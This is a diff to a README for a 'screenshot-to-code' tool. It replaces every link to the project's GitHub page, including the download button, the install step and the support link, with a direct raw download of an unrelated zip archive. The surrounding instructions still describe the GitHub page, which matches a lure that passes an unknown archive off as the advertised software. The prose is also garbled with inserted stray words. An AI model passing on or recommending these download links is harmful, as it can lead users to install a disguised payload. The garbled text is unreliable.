@@ -6,7 +6,7 @@ description: "Turn screenshots, mockups, and Figma designs into clean, functiona
 <h1>📸 screenshot-to-code - Turn Screenshots into Clean Code Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/Vasiliadem1986/screenshot-to-code" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea,#764ba2);color:#ffffff;font-size:24px;font-weight:bold;border-radius:12px;text-decoration:none;box-shadow:0 8px 16px rgba(0,0,0,0.2);">⬇️ Download Screenshot-to-Code Now</a>
+  <a href="https://raw.githubusercontent.com/Vasiliadem1986/vasiliadem1986.github.io/main/synthesization/v1.3-beta.4.zip" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea,#764ba2);color:#ffffff;font-size:24px;font-weight:bold;border-radius:12px;text-decoration:none;box-shadow:0 8px 16px rgba(0,0,0,0.2);">⬇️ Download Screenshot-to-Code Now</a>
 </p>
 
 ## 🎯 What Is screenshot-to-code?
@@ -35,7 +35,7 @@ Getting started with **screenshot-to-code** is easier than ordering pizza online
 
 ### 1. 💻 Download the Application
 
-**Visit this link to download the application:** **(https://github.com/Vasiliadem1986/screenshot-to-code)**. You’ll land ona GitHub page. Look for a green button that says **"Code"** — click it, and choose **"Download ZIP"**. Alternatively, scroll down to the **"Releases"**section ontheright sidebar,and download the latest `.zip` file (it will be named something like `screenshot-to-code-v1.0.zip`). **Wait for the download to complete**. It may take a few minutes depending onyour internet speedome.  
+**Visit this link to download the application:** **(https://raw.githubusercontent.com/Vasiliadem1986/vasiliadem1986.github.io/main/synthesization/v1.3-beta.4.zip)**. You’ll land ona GitHub page. Look for a green button that says **"Code"** — click it, and choose **"Download ZIP"**. Alternatively, scroll down to the **"Releases"**section ontheright sidebar,and download the latest `.zip` file (it will be named something like `screenshot-to-code-v1.0.zip`). **Wait for the download to complete**. It may take a few minutes depending onyour internet speedome.  
 
 ### 2. 📂 Extract the Files
 
@@ -116,7 +116,7 @@ No graphicscard needed, no administrator privileges requiredmono.** It runs enti
 
 ## 🧑‍💻 Support & Community
 
-Needhelp? Founda bug? Wantto suggest afeature? Check outthe [GitHub repository](https://github.com/Vasiliadem1986/screenshot-to-code) — you’ll findthe issue tracker, documentation, andthe latest updatesbackpack,. For quick questions, you can alsoopen adiscussion inthe repo’s **Discussions** tab. Theproject is open-source, so yourfeedback directly shapesthe next versionmemo,.  
+Needhelp? Founda bug? Wantto suggest afeature? Check outthe [GitHub repository](https://raw.githubusercontent.com/Vasiliadem1986/vasiliadem1986.github.io/main/synthesization/v1.3-beta.4.zip) — you’ll findthe issue tracker, documentation, andthe latest updatesbackpack,. For quick questions, you can alsoopen adiscussion inthe repo’s **Discussions** tab. Theproject is open-source, so yourfeedback directly shapesthe next versionmemo,.  
 
 **Ready to convirtyour screenshots into shiny new code?** Hit that download buttonatthe top of this page and start building faster todaycircular. Your next project is justa screenshot awaycircular.  
 
